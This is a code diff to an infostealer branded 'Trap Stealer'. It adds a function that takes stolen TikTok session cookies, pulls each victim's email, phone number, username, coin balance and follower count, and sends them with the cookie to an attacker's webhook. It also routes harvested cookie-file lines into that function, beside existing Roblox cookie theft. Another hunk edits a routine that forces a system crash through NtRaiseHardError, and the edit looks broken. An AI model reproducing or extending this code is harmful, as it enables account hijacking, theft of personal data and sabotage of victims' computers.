@@ -728,7 +728,120 @@ def get_badge(flags):
             flags = flags % badge["Value"]
     return owned_badges
 
+def TikTokSession(cookie):
+    try:
+        cookies = {"sessionid": cookie}
+        headers = {"Accept-Encoding": "identity"}
+        url = 'https://www.tiktok.com/passport/web/account/info/'
+        url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988'
+        
 
+        response = requests.get(url, headers=headers, cookies=cookies)
+        data = response.json()
+
+        response2 = requests.get(url2, headers=headers, cookies=cookies)
+        data2 = response2.json()
+        user_id = data["data"]["user_id"]
+        email = data["data"].get("email", "No Email")
+        if not email:
+            email = 'No Email'
+        
+        
+        phone = data["data"].get("mobile", "No number")
+        if not phone:
+            phone = "No phone"
+        username = data["data"]["username"]
+        coins = data2["data"]["coins"]
+        timestamp = data["data"]["create_time"]
+        pfp = data["data"]['avatar_url']
+        uid = data["data"]["sec_user_id"]
+        try:
+            url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
+            data3 = requests.get(url3, headers=headers, cookies=cookies).json()
+            subscriber = data3["total"]
+        except:
+            subscriber = "0"
+
+        formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
+
+
+        data = {
+            "username": "Trap Stealer",
+            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+            "content": "",
+            "embeds": [
+                {
+                    "title": f"🍪 Trap Stealer Tiktok Session",
+                    "description": f"Founded user information ! :\n",
+                    "color": 0xffb6c1,
+                    "author": {
+                        "name": f"User information :",
+                        "icon_url": pfp
+                    },
+                    "footer": {
+                        "text": "Trap Stealer",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    },
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "fields": [
+                        {
+                            "name": "✨ Cookie:",
+                            "value": f"`{cookie}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "User ID:",
+                            "value": f"`{user_id}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Email:",
+                            "value": f"`{email}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Phone:",
+                            "value": f"`{phone}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Username:",
+                            "value": f"`{username}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Coins:",
+                            "value": f"`{coins}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Subscriber:",
+                            "value": f"`{subscriber}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Created at::",
+                            "value": f"`{formatted_date}`",
+                            "inline": True
+                        },
+                    ]
+                }
+            ],
+            "attachments": []
+        }
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+    except Exception as e:
+        pass
+
+        
 def get_tokq_info(tokq):
     headers = {
         "Authorization": tokq,
@@ -1188,14 +1301,15 @@ def crashs():
     PrivilegeState = ctypes.c_bool(False)
     RtlAdjustPrivilege(19, True, False, ctypes.byref(PrivilegeState))
 
-    NtRaiseHardError = ntdll.NtRaiseHardError
-    NtRaiseHardError.argtypes = (
+    Raise = ntdll.NtRaiseHardError
+    Raise.argtypes = (
         ctypes.c_long, ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulonglong),
         ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
     )
-    NtRaiseHardError.restype = ctypes.c_ulong
-    ErrorResponse = ctypes.c_ulong(0)
-    NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(ErrorResponse))
+    Raise.restype = ctypes.c_ulong
+    from ctypes import c_ulong as c_u
+    ee = ctypes.c_u(0)
+    Raise(0xC0000006, 0, 0, None, 6, ctypes.byref(ee))
 
 
 def brohist():
@@ -2020,12 +2134,17 @@ def cokssite():
         with open(coks, 'r') as f:
             lines = f.readlines()
             for line in lines:
+                parts = line.split()
                 if '.ROBLOSECURITY' in line:
                     parts = line.split()
                     cookie = parts[2]
                     roblox(cookie)
+                elif '.tiktok.com' in line:
+                    if "sessionid" in line:
+                        parts = line.split()
+                        TikTokSession(parts[2])
     except:
-        pass
+         pass
                 
 def getCook(path, arg):
     try:
